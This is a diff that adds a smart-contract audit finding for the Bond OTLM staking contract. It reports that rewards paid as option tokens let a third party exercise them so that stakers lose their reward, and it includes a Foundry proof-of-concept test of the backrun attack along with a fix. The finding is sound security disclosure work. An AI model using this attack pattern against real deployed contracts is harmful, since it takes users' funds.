@@ -1,0 +1,75 @@
+# [H] A malicious user can use a backrun attack to make the staking user lose the reward
+
+## Summary
+Severity: High
+Reporter: kutugu
+Source: https://github.com/sherlock-audit/2023-06-bond/blob/fce1809f83728561dc75078d41ead6d60e15d065/options/src/fixed-strike/liquidity-mining/OTLM.sol#L508
+Type: audit-issue
+
+## Details
+# A malicious user can use a backrun attack to make the staking user lose the reward
+
+## Summary
+
+When OTLM allocates rewards, it allocates by optionTokens, not payoutTokens. As a result, anyone can exercise optionTokens through teller, and the quoteToken will be sent to the receiver instead of the staking user, so the staking user does not receive any reward.
+
+## Vulnerability Detail
+
+```solidity
+    // FixedStrikeOTLM.t.sol
+    function testBackrunAttack() public {
+        _manualStrikeOTLM();
+
+        vm.prank(bob);
+        motlm.stake(1 ether, ZERO_BYTES);
+
+        skip(motlm.epochDuration());
+
+        vm.prank(bob);
+        motlm.claimRewards();
+
+        FixedStrikeOptionToken rewardToken = motlm.epochOptionTokens(1);
+        uint256 rewardBalance = rewardToken.balanceOf(address(bob));
+
+        def.mint(carol, 1e24);
+        ghi.mint(carol, 3.5e22);
+        vm.startPrank(carol);
+        def.approve(address(teller), type(uint256).max);
+        teller.create(rewardToken, 7e21);
+        ghi.approve(address(teller), type(uint256).max);
+        teller.exercise(rewardToken, rewardBalance);
+        vm.stopPrank();
+        
+        uint256 bobPayoutBalance = def.balanceOf(address(bob));
+        uint256 carolPayoutBalance = def.balanceOf(address(carol));
+        uint256 bobQuoteTokenBalance = ghi.balanceOf(address(bob));
+        uint256 aliceQuoteTokenBalance = ghi.balanceOf(address(alice));
+
+        // bob get nothing
+        assertEq(bobPayoutBalance, 0);
+        assertEq(bobQuoteTokenBalance, 0);
+        // carol lose Nothing
+        assertEq(carolPayoutBalance, 1e24);
+        // receiver get quoteToken after protocol fee
+        assertEq(aliceQuoteTokenBalance, 3.5e22 * 95 / 100);
+    }
+```
+
+The above code is an instantaneous backrun attack that causes the staking user to lose the reward and the attacker to lose nothing.
+
+## Impact
+
+A malicious user can use a backrun attack to make the staking user lose the reward   
+
+## Code Snippet
+
+- https://github.com/sherlock-audit/2023-06-bond/blob/fce1809f83728561dc75078d41ead6d60e15d065/options/src/fixed-strike/liquidity-mining/OTLM.sol#L508
+- https://github.com/sherlock-audit/2023-06-bond/blob/fce1809f83728561dc75078d41ead6d60e15d065/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L354-L361
+
+## Tool used
+
+Foundry
+
+## Recommendation
+
+Rewards should be assigned as payoutTokens, not optionTokens. This way others can't attack, and it also solves the problem of optionTokens expiring.
